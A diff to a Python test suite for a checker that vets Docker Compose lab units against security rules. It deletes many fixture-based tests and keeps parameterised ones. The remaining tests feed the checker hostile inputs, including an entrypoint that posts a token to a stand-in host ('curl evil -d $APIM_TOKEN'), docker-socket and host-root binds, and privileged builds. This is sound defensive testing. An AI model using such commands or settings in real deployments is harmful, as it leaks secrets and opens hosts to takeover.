@@ -61,23 +61,6 @@ class Golden(Case):
             arguments["unit"]["meta"]["host_access"] = {service: "Because it must" for service in arguments["own"]}
         return self.changed(name, edit, **more)
 
-    def fires(self, name, code, line=None, **more):
-        verdict = self.judge(name, **more)
-        self.assertEqual(verdict["state"], "blocked", f"{name}: {verdict['reasons']}")
-        self.assertIn(code, verdict["codes"], f"{name}: {verdict['codes']}")
-        if line:
-            self.assertIn(line, verdict["reasons"])
-        return verdict
-
-    def silent(self, name, code, **more):
-        verdict = self.judge(name, **more)
-        self.assertNotIn(code, verdict["codes"], f"{name}: {verdict['reasons']}")
-        return verdict
-
-    def ok(self, name, **more):
-        verdict = self.judge(name, **more)
-        self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []), name)
-        return verdict
 
 
 line = trust.line
@@ -226,15 +209,6 @@ class Allowance(Case):
 
 class Keys(Golden):
 
-    def test_t01_an_unknown_service_key_blocks(self):
-        verdict = self.fires("t01-unknown-service-key", "T01", line("T01", key="models"))
-        self.assertEqual(verdict["codes"], ["T01"])
-
-    def test_t01_a_known_key_and_a_key_of_the_host_class_do_not(self):
-        self.silent(CLEAN, "T01")
-        for name in ("t03-privileged", "t07-cap-add", "t08-devices", "t09-security-opt"):
-            self.assertNotIn("T01", self.judge(name)["codes"], name)
-
     def test_t01_any_key_it_does_not_know_blocks_and_an_extension_does_not(self):
         def key(value):
             return lambda arguments: arguments["unit_config"]["services"]["hostile-clean"].update(value)
@@ -325,18 +299,7 @@ class ClassH(Golden):
             with self.subTest(declaration=declaration):
                 self.assertIn("T28", self.changed("t03-privileged", edit, listed=True)["codes"])
 
-    def test_the_default_catalog_is_judged_like_any_other(self):
-        verdict = self.judge("t03-privileged", listed=True)
-        self.assertEqual((verdict["state"], verdict["codes"]), ("blocked", ["T28"]))
-
-    def test_t03_fails_without_the_catalog_and_passes_with_the_catalog_and_a_declaration(self):
-        self.fires("t03-privileged", "T03", line("T03"))
-        self.assertEqual(self.judge("h-privileged-declared", listed=True)["state"], "ok")
-        self.assertEqual(self.judge("h-privileged-declared")["reasons"], [line("T03")])
-
     def test_t04_to_t05_the_docker_api_and_a_program_of_the_host(self):
-        self.fires("t04-api-socket", "T04", line("T04"))
-        self.fires("t05-provider", "T05", line("T05"))
         self.assertEqual(self.declared("t04-api-socket", listed=True)["state"], "ok")
         self.assertEqual(self.declared("t05-provider", listed=True)["state"], "ok")
         def edit(arguments):
@@ -344,7 +307,6 @@ class ClassH(Golden):
         self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
 
     def test_t06_the_first_namespace_it_shares_is_the_line(self):
-        self.fires("t06-host-network", "T06", line("T06", 0))
         for key, variant in (("pid", 1), ("ipc", 2), ("uts", 3), ("userns_mode", 3), ("cgroup", 3), ("cgroup_parent", 3)):
             def edit(arguments, key=key):
                 service = arguments["unit_config"]["services"]["hostile-clean"]
@@ -380,13 +342,11 @@ class ClassH(Golden):
         self.assertEqual(item["what"], ["shares the processes of another container"])
 
     def test_t07_capabilities_to_add_but_not_to_drop(self):
-        self.fires("t07-cap-add", "T07", line("T07"))
         def edit(arguments):
             arguments["unit_config"]["services"]["hostile-clean"]["cap_drop"] = ["ALL"]
         self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
 
     def test_t08_a_device_a_rule_a_gpu_a_runtime_and_a_reservation(self):
-        self.fires("t08-devices", "T08", line("T08"))
         for key, value in (("device_cgroup_rules", ["c 1:3 mr"]), ("gpus", [{"count": -1}]), ("runtime", "nvidia"),
                            ("deploy", {"resources": {"reservations": {"devices": [{"driver": "nvidia"}]}}})):
             def edit(arguments, key=key, value=value):
@@ -398,7 +358,6 @@ class ClassH(Golden):
         self.assertEqual(self.changed(CLEAN, fine)["state"], "ok")
 
     def test_t09_only_no_new_privileges_is_not_a_lowering(self):
-        self.fires("t09-security-opt", "T09", line("T09"))
         for option in ("no-new-privileges", "no-new-privileges:true", "No-New-Privileges=true"):
             def edit(arguments, option=option):
                 arguments["unit_config"]["services"]["hostile-clean"]["security_opt"] = [option]
@@ -430,7 +389,6 @@ class ClassH(Golden):
 class Mounts(Golden):
 
     def test_t10_the_docker_socket_by_name_by_link_and_by_pipe(self):
-        self.fires("t10-docker-socket", "T10", line("T10"))
         def pipe(arguments):
             arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [{"type": "npipe", "source": "//./pipe/docker_engine", "target": "/x"}]
         self.assertEqual(self.changed(CLEAN, pipe)["reasons"], [line("T10")])
@@ -448,9 +406,6 @@ class Mounts(Golden):
                 {"type": "bind", "source": str(folder / "engine"), "target": "/x", "read_only": True}]
         self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T10")])
         self.assertEqual(self.changed(CLEAN, edit, realpath=None)["state"], "ok")
-
-    def test_t10_passes_without_it(self):
-        self.silent(CLEAN, "T10")
 
     def test_t01_a_mount_the_policy_cannot_place_is_no_mount(self):
         """A type Compose 5 does not print, or a bind with no source, falls through every branch and passes: default-deny
@@ -473,13 +428,7 @@ class Mounts(Golden):
             service.update(frobnicate=1, volumes=[{"type": "cluster", "source": "a", "target": "/a"}, {"type": "bind", "target": "/b"}])
         self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T01", key="frobnicate, volumes.type, volumes.source")])
 
-    def test_t11_a_bind_outside_its_folder_is_a_class_h_finding(self):
-        self.fires("t11-bind-outside", "T11", line("T11"))
-        self.assertNotIn("T11", self.judge("t11-bind-outside", listed=True)["codes"])
-
-    def test_t11_the_folder_of_the_unit_a_plugin_folder_and_the_closure_are_allowed(self):
-        self.silent(CLEAN, "T11")
-        self.ok("h-sibling-bind-ro")
+    def test_t11_a_plugin_folder_is_allowed(self):
         def plugins(arguments):
             arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                 {"type": "bind", "source": str(self.root / "plugins/apim"), "target": "/p"},
@@ -502,7 +451,6 @@ class Mounts(Golden):
 
     def test_t11_the_files_of_the_lab_are_out_of_reach_whatever_is_declared(self):
         self.assertEqual(self.declared("t11-bind-lab-state", listed=True)["reasons"], [line("T11")])
-        self.assertEqual(self.judge("t11-bind-lab-state", listed=True)["reasons"], [line("T11")])
         for source in ("/", str(self.root), str(self.root.parent), str(self.root / ".lab"), str(self.root / ".lab/catalogs"),
                        str(self.root / ".env"), str(self.root / ".lab/catalogs/partner/addons/ledger/secrets")):
             def edit(arguments, source=source):
@@ -588,34 +536,11 @@ class Mounts(Golden):
                 {"type": "bind", "source": unit + "/./a/../.state/x", "target": "/x"}]
         self.assertEqual(self.changed(CLEAN, inside, realpath=None)["state"], "ok")
 
-    def test_t12_a_writable_bind_of_its_folder_blocks_and_its_state_and_secrets_do_not(self):
-        self.fires("t12-bind-writable", "T12", line("T12"))
-        self.ok("h-secrets-rw")
-        self.silent(CLEAN, "T12")
-
-    def test_t12_a_writable_bind_of_a_unit_of_the_closure_blocks_and_a_read_only_one_does_not(self):
-        self.fires("h-sibling-bind-rw", "T12", line("T12"))
-        self.ok("h-sibling-bind-ro")
-
     def test_t12_a_writable_bind_of_the_folder_itself_blocks(self):
         def edit(arguments):
             arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                 {"type": "bind", "source": arguments["roots"]["unit"], "target": "/x"}]
         self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T12")])
-
-    def test_t13_volumes_from_blocks(self):
-        verdict = self.fires("t13-volumes-from", "T13", line("T13"))
-        self.assertIn(line("T01", key="volumes_from"), verdict["reasons"])
-        self.silent(CLEAN, "T13")
-
-    def test_t14_an_external_a_foreign_or_disguised_volume_blocks(self):
-        for name in ("t14-external-volume", "t14-core-volume", "t14-volume-alias"):
-            with self.subTest(unit=name):
-                self.assertEqual(self.judge(name)["reasons"], [line("T14")])
-
-    def test_t14_a_volume_of_its_own_does_not(self):
-        self.silent(CLEAN, "T14")
-        self.assertEqual(self.judge(CLEAN)["state"], "ok")
 
     def test_t14_every_way_to_make_a_volume_a_folder_of_the_host(self):
         for definition in ({"driver": "nfs"}, {"driver_opts": {"device": "/etc", "o": "bind", "type": "none"}},
@@ -629,13 +554,6 @@ class Mounts(Golden):
             arguments["unit_config"]["volumes"]["clean-data"] = {"name": "gravitee_clean-data", "driver": "local",
                                                                  "driver_opts": {"type": "tmpfs", "o": "size=1m"}}
         self.assertEqual(self.changed(CLEAN, fine)["state"], "ok")
-
-    def test_t15_an_external_network_blocks(self):
-        self.fires("t15-external-network", "T15", line("T15"))
-
-    def test_t15_the_lab_networks_and_a_bridge_of_its_own_do_not(self):
-        self.silent(CLEAN, "T15")
-        self.assertIn("own", self.args(CLEAN)["unit_config"]["networks"])
 
     def test_t15_every_way_to_leave_the_bridge(self):
         for definition in ({"driver": "host"}, {"driver": "macvlan"}, {"driver": "ipvlan"}, {"driver_opts": {"parent": "eth0"}},
@@ -668,7 +586,6 @@ class Mounts(Golden):
 
     def test_t15_an_alias_of_a_service_of_the_platform_blocks(self):
         """A name on the lab network answers to the container that took it: `apim-management-api` must be the platform's."""
-        self.assertEqual(self.judge("t15-alias-hijack")["reasons"], [line("T15")])
         core = regen.load("core")["services"]
         name = next(service["container_name"] for service in core.values() if service.get("container_name"))
         for alias in ("apim-management-api", "mongodb", name):
@@ -696,7 +613,6 @@ class Mounts(Golden):
         self.assertEqual(self.changed(CLEAN, odd)["state"], "ok")
 
     def test_t16_a_secret_or_a_config_from_outside_its_folder_blocks(self):
-        self.fires("t16-secret-file", "T16", line("T16"))
         for key, definition in (("secrets", {"environment": "HOME"}), ("secrets", {"external": True}),
                                 ("configs", {"file": "/etc/hosts"}), ("configs", {"environment": "X"})):
             def edit(arguments, key=key, definition=definition):
@@ -709,10 +625,6 @@ class Mounts(Golden):
             arguments["unit_config"]["secrets"] = {"k": {"name": "gravitee_k", "file": arguments["roots"]["unit"] + "/key.txt"}}
             arguments["unit_config"]["configs"] = {"c": {"name": "gravitee_c", "content": "hello"}}
         self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
-
-    def test_t17_a_port_with_no_loopback_address_blocks(self):
-        self.fires("t17-all-interfaces", "T17", line("T17"))
-        self.silent(CLEAN, "T17")
 
     def test_t17_every_address_that_is_not_loopback(self):
         for port in ({"target": 80, "published": "8199"}, {"target": 80}, {"target": 80, "published": "1", "host_ip": "0.0.0.0"},
@@ -731,11 +643,7 @@ class Mounts(Golden):
 
 class Builds(Golden):
 
-    def test_t18_a_context_outside_its_folder_blocks(self):
-        self.assertEqual(self.judge("t18-build-outside")["reasons"], [line("T18", 0)])
-
     def test_t18_a_remote_context_must_be_a_git_repository_at_a_commit(self):
-        self.assertEqual(self.judge("t18-build-remote-unpinned")["reasons"], [line("T18", 1)])
         sha = "0123456789abcdef0123456789abcdef01234567"
         for context, state in ((f"https://example.invalid/app.git#{sha}", "ok"), (f"git@example.invalid:o/r.git#{sha}", "ok"),
                                (f"https://example.invalid/app.git#{sha}:sub", "ok"), (f"github.com/o/r#{sha}", "ok"),
@@ -761,18 +669,6 @@ class Builds(Golden):
                 return value
             arguments["unit_config"]["services"]["hostile-clean"]["build"] = fill(build)
         return self.changed(name, edit, **more)
-
-    def test_t18_extra_access_blocks(self):
-        for name in ("t18-build-extra-access", "t18-build-core-image"):
-            self.assertEqual(self.judge(name)["reasons"], [line("T18", 2)], name)
-        for key, value in (("ssh", ["default"]), ("secrets", [{"source": "k"}]), ("cache_to", ["type=local"]),
-                           ("entitlements", ["network.host"]), ("tags", ["other:1"]), ("network", "host"), ("privileged", True)):
-            def edit(arguments, key=key, value=value):
-                build = arguments["unit_config"]["services"]["hostile-clean"]["build"]
-                arguments["unit_config"]["services"]["hostile-clean"]["build"] = dict(
-                    {"context": arguments["roots"]["unit"]} if isinstance(build, str) else {"context": arguments["roots"]["unit"]}, **{key: value})
-            with self.subTest(key=key):
-                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T18", 2)] if key != "privileged" else [line("T03"), line("T18", 2)])
 
     # What Compose 5.6 knows of a build (the Compose file reference), and what a later Compose may add: none is accepted but the
     # five of the allow-list, so a key that is not in this list blocks as well (the last two)
@@ -855,8 +751,6 @@ class Builds(Golden):
                 self.assertTrue(set(service["build"]) <= set(trust.BUILD_KEYS), service["build"])
 
     def test_t18_the_folder_of_the_unit_and_the_seeder_are_the_only_local_contexts(self):
-        self.silent(CLEAN, "T18")
-        self.silent(PLAYGROUND, "T18")
         def edit(arguments):
             arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": arguments["roots"]["seeder"]}
         self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
@@ -1451,12 +1345,7 @@ class Screen(Case):
 class Settings(Golden):
     """T20."""
 
-    def test_t20_a_setting_that_is_not_its_own_blocks(self):
-        verdict = self.judge("t20-foreign-setting")
-        self.assertEqual(verdict["reasons"], [line("T20", names="SOME_OTHER_TOOL_TOKEN")])
-
-    def test_t20_a_setting_the_catalog_declares_does_not(self):
-        self.ok("t20-declared-setting")
+    def test_t20_a_setting_the_catalog_does_not_declare_blocks(self):
         self.assertEqual(self.judge("t20-declared-setting", shared_settings=[])["reasons"], [line("T20", names="FIXTURE_SHARED_TOKEN")])
 
     def test_t20_the_names_a_unit_may_read(self):
@@ -1491,12 +1380,7 @@ class Settings(Golden):
             with self.subTest(ns=ns, name=name):
                 self.assertEqual("T20" not in self.changed(CLEAN, edit)["codes"], ok)
 
-    def test_t20_a_variable_passed_through_from_the_shell_is_read(self):
-        self.assertEqual(self.judge("t20-passthrough")["reasons"], [line("T20", names="AWS_SECRET_ACCESS_KEY")])
-
     def test_t20_a_seed_reads_the_environment_of_its_own_container(self):
-        self.ok(PLAYGROUND)
-        self.assertEqual(self.judge("n02-seed-reads-foreign-setting")["reasons"], [line("T20", names="SOME_OTHER_TOOL_TOKEN")])
         def edit(arguments):
             arguments["unit"]["seed_references"] = ["HOSTILE_DEMO_PASSWORD", "APIM_GATEWAY_URL", "NOT_DEFINED"]
         self.assertEqual(self.changed(PLAYGROUND, edit)["reasons"], [line("T20", names="NOT_DEFINED")])
@@ -1543,23 +1427,7 @@ class Settings(Golden):
 class Overlays(Golden):
     """T22."""
 
-    def test_t22_changing_more_than_settings_blocks(self):
-        self.assertEqual(self.judge("t22-overlay-too-much")["reasons"], [line("T22", label="Gateway")])
-
-    def test_t22_adding_settings_does_not(self):
-        verdict = self.ok("p-overlay-ok")
-        self.assertEqual(verdict["surface"]["core"], [{"service": "apim-gateway", "label": "Gateway",
-                                                       "keys": ["depends_on", "environment", "extra_hosts", "labels", "ports", "volumes"]}])
-
-    def test_t22_a_named_volume_the_unit_declares_itself_is_no_more_than_a_bind_of_its_folder(self):
-        """Acme Bakery keeps the gateway's models in a volume of its own. T14 vets the declaration (not external, a local
-        driver, a name of its own), T21 the name; the content is the unit's either way."""
-        verdict = self.ok("p-overlay-volume")
-        self.assertEqual(verdict["surface"]["core"], [{"service": "apim-gateway", "label": "Gateway", "keys": ["volumes"]}])
-        self.assertEqual(self.judge("p-overlay-volume", listed=True)["reasons"], [])
-
     def test_t22_a_volume_of_the_platform_is_not_the_units_to_mount(self):
-        self.assertEqual(self.judge("t22-overlay-core-volume")["reasons"], [line("T22", label="Gateway")])
         def again(arguments):
             arguments["unit_config"]["volumes"] = {"data-mongo": {"name": "gravitee_data-mongo", "labels": {"x": "y"}}}
         self.assertEqual(self.changed("t22-overlay-core-volume", again)["reasons"], [line("T22", label="Gateway")])
@@ -1638,7 +1506,6 @@ class Overlays(Golden):
         self.assertEqual(self.changed("p-overlay-ok", own)["reasons"], [line("T22", label="Gateway")])
 
     def test_t22_is_a_rule_of_the_lab_not_of_this_machine_whatever_the_catalog_may(self):
-        self.assertEqual(self.judge("t22-overlay-too-much", listed=True)["reasons"], [line("T22", label="Gateway")])
         self.assertEqual(self.declared("t22-overlay-too-much", listed=True)["reasons"], [line("T22", label="Gateway")])
 
     def test_the_overlays_of_a_unit_are_what_its_own_file_adds(self):
@@ -1659,15 +1526,7 @@ class Overlays(Golden):
 class Includes(Golden):
     """T23 to T27."""
 
-    def test_t23_an_include_outside_the_allowed_set_blocks(self):
-        verdict = self.judge("t23-include-outside")
-        self.assertIn(line("T23"), verdict["reasons"])
-        self.assertEqual(self.judge("t23-includes-a-setup")["reasons"], [line("T23")])
-
-    def test_t23_an_include_of_its_own_catalog_or_a_declared_one_does_not(self):
-        self.silent("p-pair", "T23")
-        self.silent("h-sibling-bind-ro", "T23")
-        self.silent("t24-public-needs-private", "T23")
+    def test_t23_an_include_of_a_catalog_it_does_not_declare_blocks(self):
         self.assertIn("T23", self.judge("t24-public-needs-private", requires=[])["codes"])
 
     def test_t23_every_target_that_is_not_an_allowed_unit(self):
@@ -1697,36 +1556,13 @@ class Includes(Golden):
             arguments["unit"]["includes"] = ["../../x", ".lab/catalogs/local/addons/x/compose.yml"]
         self.assertEqual(self.changed("h-secrets-rw", edit, local=True)["state"], "ok")
 
-    def test_t24_a_public_unit_may_not_depend_on_a_private_one(self):
-        verdict = regen.pipeline(self.root)["t24-public-needs-private"]
-        self.assertEqual(verdict["reasons"], [line("T24")])
-        self.assertEqual(verdict["codes"], ["T24"])
-        self.assertEqual(self.judge("t24-public-needs-private")["state"], "ok")
-
-    def test_t24_a_private_unit_may_depend_on_both(self):
-        self.assertFalse(resolve.audience_blocked(resolve.rank("private"), resolve.rank("private")))
-        self.assertFalse(resolve.audience_blocked(resolve.rank("private"), resolve.rank("public")))
-        self.assertFalse(resolve.audience_blocked(resolve.rank("public"), resolve.rank("public")))
-        self.assertTrue(resolve.audience_blocked(resolve.rank("public"), resolve.rank("private")))
-
-    def test_t25_a_unit_that_brings_a_blocked_one_is_blocked(self):
-        verdict = regen.pipeline(self.root)["t25-needs-blocked"]
-        self.assertEqual(verdict["reasons"], [line("T25", name="Writable bind")])
-        self.assertEqual(verdict["closure"], [("addon", "t25-needs-blocked"), ("addon", "t12-bind-writable")])
-        self.assertEqual(self.judge("t25-needs-blocked")["state"], "ok")
-
-    def test_t25_a_unit_that_brings_a_good_one_is_not(self):
-        verdict = regen.pipeline(self.root)["h-sibling-bind-ro"]
-        self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []))
-
     def test_t25_a_personal_unit_that_brings_a_blocked_one_cannot_start_either(self):
         own = self.judge(CLEAN, local=True)
         self.assertEqual(own["state"], "ok")
         combined = trust.combine([own, self.judge("t12-bind-writable")])
         self.assertEqual((combined["state"], combined["reasons"]), ("blocked", [line("T25", name="Writable bind")]))
 
-    def test_t26_a_unit_written_for_a_newer_lab_blocks(self):
-        self.assertEqual(self.judge("t26-newer-lab")["reasons"], [line("T26", 0, level=99, min=regen.LEVELS[1], max=regen.LEVELS[0])])
+    def test_t26_a_unit_of_the_level_of_this_lab_does_not(self):
         self.assertEqual(self.judge("t26-newer-lab", contract=99)["state"], "ok")
 
     def test_t26_a_unit_written_for_an_older_lab_blocks(self):
@@ -1743,12 +1579,6 @@ class Includes(Golden):
                 arguments["context"]["level"] = level
             with self.subTest(level=level):
                 self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
-
-    def test_t27_a_unit_compose_cannot_read_is_blocked_with_the_last_line(self):
-        verdict = self.judge("t27-unreadable")
-        self.assertEqual(verdict["codes"], ["T27"])
-        self.assertRegex(verdict["reasons"][0], r"^Cannot be read: failed to parse addons/t27-unreadable/compose\.yml: ")
-        self.assertEqual(verdict["surface"], trust.empty_surface())
 
     def test_t27_no_path_of_this_machine_reaches_the_line(self):
         for error in (f"open {self.root}/addons/x/compose.yml: no such file", "failed to parse /Users/me/dev/lab/.lab/catalogs/ns/a.yml: bad",
@@ -1770,25 +1600,15 @@ class Includes(Golden):
             arguments["context"].pop("error", None)
         self.assertEqual(self.changed(CLEAN, none)["reasons"], [line("T27", last="unreadable")])
 
-    def test_t27_a_readable_unit_has_no_such_reason(self):
-        self.silent(CLEAN, "T27")
-
     def test_t29_an_item_that_says_whose_copy_it_is_is_blocked_and_one_of_this_machine_is_not(self):
         def claims(arguments):
             arguments["unit"]["meta"]["copy_of"] = "tour"
         self.assertEqual(self.changed(CLEAN, claims)["reasons"], [line("T29")])
-        self.silent(CLEAN, "T29")
 
         def mine(arguments):
             claims(arguments)
             arguments["context"]["local"] = True
         self.assertEqual(self.changed(CLEAN, mine)["reasons"], [], "the person's copy says it, as the Lab wrote it")
-
-    def test_t28_a_class_h_finding_with_no_declaration_is_told_off(self):
-        self.assertEqual(self.judge("t03-privileged", listed=True)["reasons"], [line("T28", service="hostile-privileged")])
-
-    def test_t28_a_declaration_passes(self):
-        self.assertEqual(self.judge("h-privileged-declared", listed=True)["reasons"], [])
 
     def test_t28_names_the_services_that_say_nothing(self):
         def edit(arguments):
@@ -1813,15 +1633,6 @@ class Added(Golden):
 class Collisions(Golden):
     """T21, from resolve.collisions with what judge says of a unit."""
 
-    def test_t21_a_unit_that_defines_what_an_earlier_one_holds_is_blocked(self):
-        verdict = regen.pipeline(self.root)["t21-name-clash"]
-        self.assertEqual((verdict["state"], verdict["reasons"], verdict["codes"]), ("blocked", ["Same name as Echo"], ["T21"]))
-        self.assertEqual(self.judge("t21-name-clash")["state"], "ok")
-
-    def test_t21_a_unit_whose_names_nobody_holds_is_not(self):
-        verdict = regen.pipeline(self.root)[CLEAN]
-        self.assertNotIn("T21", verdict["codes"])
-
     def test_the_names_a_unit_can_clash_on(self):
         arguments = self.args(CLEAN)
         names = resolve.owned_names(arguments["unit_config"], arguments["core_config"], arguments["own"])
@@ -1831,13 +1642,7 @@ class Collisions(Golden):
 class Notes(Golden):
     """N01 to N05: restrictions that do not block."""
 
-    def test_n01_a_seed_built_from_its_own_folder_is_not_the_labs(self):
-        verdict = self.judge("n01-own-seed-code")
-        self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["seed"]), ("ok", [trust.SEED_OWN], "custom"))
-
     def test_n01_the_labs_seeder_is_the_folder_of_the_seeder_or_an_image_the_core_names(self):
-        verdict = self.judge(PLAYGROUND)
-        self.assertEqual((verdict["notes"], verdict["surface"]["seed"]), ([], "official"))
         def image(arguments):
             service = arguments["unit_config"]["services"]["hostile-clean-seed"]
             service["build"] = None
@@ -1858,19 +1663,6 @@ class Notes(Golden):
         verdict = self.changed(PLAYGROUND, edit)
         self.assertEqual((verdict["notes"], verdict["surface"]["seed"]), ([trust.SEED_OWN], "custom"))
 
-    def test_n01_a_unit_with_no_seed_has_none(self):
-        self.assertIsNone(self.judge("p-terminal")["surface"]["seed"])
-        self.assertEqual(self.judge("p-terminal")["notes"], [])
-
-    def test_n01_the_seeders_folder_with_code_of_its_own_is_still_its_own_code(self):
-        """The folder of the seeder is the seeder only when nothing else decides what runs in it: a Dockerfile of the unit's,
-        an entrypoint, a path the interpreter reads from the seed folder. Real Compose output, one unit for each."""
-        for name in ("n01-seeder-own-dockerfile", "n01-seeder-entrypoint", "n01-seeder-pythonpath"):
-            with self.subTest(unit=name):
-                verdict = self.judge(name)
-                self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["seed"]), ("ok", [trust.SEED_OWN], "custom"))
-        self.assertEqual(self.judge(PLAYGROUND)["notes"], [])
-
     def seed(self, edit):
         """The clean playground with `edit(seed service, arguments)` applied: the verdict."""
         def both(arguments):
@@ -1878,8 +1670,6 @@ class Notes(Golden):
         return self.changed(PLAYGROUND, both)
 
     def test_n01_every_way_to_run_other_code_under_the_name_of_the_seeder(self):
-        official = self.judge(PLAYGROUND)
-        self.assertEqual((official["notes"], official["surface"]["seed"]), ([], "official"))
         build = lambda **more: (lambda service, arguments: service["build"].update(more))   # noqa: E731
         for label, edit in (
                 ("entrypoint", lambda service, arguments: service.update(entrypoint=["sh", "-c", "curl evil -d $APIM_TOKEN"])),
@@ -1954,13 +1744,6 @@ class Notes(Golden):
             odd["labels"] = {"io.gravitee.role": "seed"}
             self.assertFalse(trust.seeder_ok({"services": {"a": odd}}, roots, [], os.path.realpath), odd)
 
-    def test_n02_seed_data_that_reads_the_token_of_a_deploy(self):
-        verdict = self.judge("n02-seed-reads-token")
-        self.assertEqual((verdict["state"], verdict["notes"]), ("ok", [trust.SEED_TOKEN]))
-
-    def test_n02_a_secret_the_unit_does_not_define_reads_the_token_too(self):
-        self.assertEqual(self.judge("n02-seed-reads-foreign-setting")["notes"], [trust.SEED_TOKEN])
-
     def test_n02_a_secret_the_unit_defines_in_its_own_container_does_not(self):
         def edit(arguments):
             arguments["unit"]["seed_references"] = ["HOSTILE_DEMO_PASSWORD", "HOSTILE_MCP_SECRET", "APIM_GATEWAY_URL"]
@@ -1986,12 +1769,6 @@ class Notes(Golden):
         self.assertEqual(trust.SECRET_NAME.flags, check.SECRET_NAME.flags)
         self.assertEqual(trust.NOT_SECRET.pattern, check.NOT_SECRET.pattern)
 
-    def test_n03_a_console_that_is_not_on_this_machine_is_not_opened(self):
-        self.assertEqual(self.judge("n03-external-console")["notes"], [line("N03")])
-
-    def test_n03_a_console_on_this_machine_is_fine(self):
-        self.assertEqual(self.judge(CLEAN)["notes"], [])
-
     def test_n03_a_host_check_is_held_to_the_same(self):
         for url, ok in (("http://localhost:11434/api/tags", True), ("https://huggingface.co", False)):
             def edit(arguments, url=url):
@@ -2010,11 +1787,6 @@ class Notes(Golden):
             with self.subTest(url=url):
                 self.assertEqual(trust.local_address(url), local)
 
-    def test_n04_a_gateway_declared_by_a_catalog_that_is_neither_listed_allowed_nor_local(self):
-        verdict = self.judge("n04-foreign-gateway")
-        self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["reads"]), ("ok", [line("N04")], []))
-        self.assertFalse(trust.declared_ok({}))
-
     def test_n04_a_listed_an_allowed_or_a_personal_catalog_may_declare_one_and_the_token_is_said(self):
         for more in ({"listed": True}, {"allowed": True}, {"local": True}):
             with self.subTest(more=more):
@@ -2032,13 +1804,6 @@ class Notes(Golden):
             with self.subTest(gateway=gateway):
                 self.assertEqual(self.changed("n04-foreign-gateway", edit)["notes"], [])
 
-    def test_n05_a_terminal_in_a_service_of_the_platform_is_not_offered(self):
-        verdict = self.judge("n05-foreign-terminal")
-        self.assertEqual((verdict["state"], verdict["notes"]), ("ok", [line("N05")]))
-
-    def test_n05_a_terminal_in_a_service_of_its_own_is_offered(self):
-        self.assertEqual(self.judge("p-terminal")["notes"], [])
-
     def test_n05_the_terminal_of_a_unit_in_the_services_it_brings_or_not_its_seed(self):
         offered, refused = [], [line("N05")]
         for terminal, brought, notes in (("hostile-clean-app", [], offered), ("hostile-clean-seed", [], refused), ("apim-gateway", ["redis"], refused),
@@ -2051,10 +1816,6 @@ class Notes(Golden):
             with self.subTest(terminal=terminal):
                 self.assertEqual(self.changed(PLAYGROUND, edit)["notes"], notes)
 
-    def test_the_notes_never_block(self):
-        for name in ("n01-own-seed-code", "n02-seed-reads-token", "n03-external-console", "n04-foreign-gateway", "n05-foreign-terminal"):
-            self.assertEqual(self.judge(name)["state"], "ok", name)
-
     def test_the_notes_of_a_unit_of_this_machine_stay_but_its_gateway_is_its_own(self):
         self.assertEqual(self.judge("n01-own-seed-code", local=True)["notes"], [trust.SEED_OWN])
         self.assertEqual(self.judge("n03-external-console", local=True)["notes"], [line("N03")])
@@ -2064,11 +1825,6 @@ class Notes(Golden):
 
 class Surface(Golden):
     """What the preview shows."""
-
-    def test_what_a_clean_unit_will_do(self):
-        surface = self.judge(CLEAN)["surface"]
-        self.assertEqual(surface, {"builds": [{"service": "hostile-clean", "source": "local"}], "ports": [8397], "core": [],
-                                   "reads": [], "plugins": [], "seed": None, "uses_machine": []})
 
     def test_the_builds_by_source(self):
         def edit(arguments):
@@ -2090,7 +1846,6 @@ class Surface(Golden):
         self.assertEqual(self.changed(CLEAN, edit)["surface"]["ports"], [8100, 9000])
 
     def test_what_it_adds_to_the_platform_by_its_label(self):
-        self.assertEqual(self.judge("p-overlay-ok")["surface"]["core"][0]["label"], "Gateway")
         def edit(arguments):
             arguments["overlaid"] = {"redis": {"environment": {"A": "1"}}, "unknown-service": {"labels": {"a": "b"}}}
         core = self.changed("p-overlay-ok", edit)["surface"]["core"]
@@ -2438,11 +2193,6 @@ class Verdicts(Golden):
         arguments = self.args("t12-bind-writable", screened=[line("T19", 0)])
         verdict = trust.judge(**arguments)
         self.assertEqual((verdict["state"], verdict["reasons"], verdict["codes"]), ("blocked", [line("T19", 0)], ["T19"]))
-
-    def test_a_unit_that_compose_could_not_read_is_judged_on_what_is_known(self):
-        verdict = self.judge("t23-include-outside")
-        self.assertEqual(verdict["codes"], ["T23", "T27"])
-        self.assertEqual(verdict["notes"], [])
 
     def test_the_default_context_is_the_narrowest(self):
         arguments = self.args("h-privileged-declared")
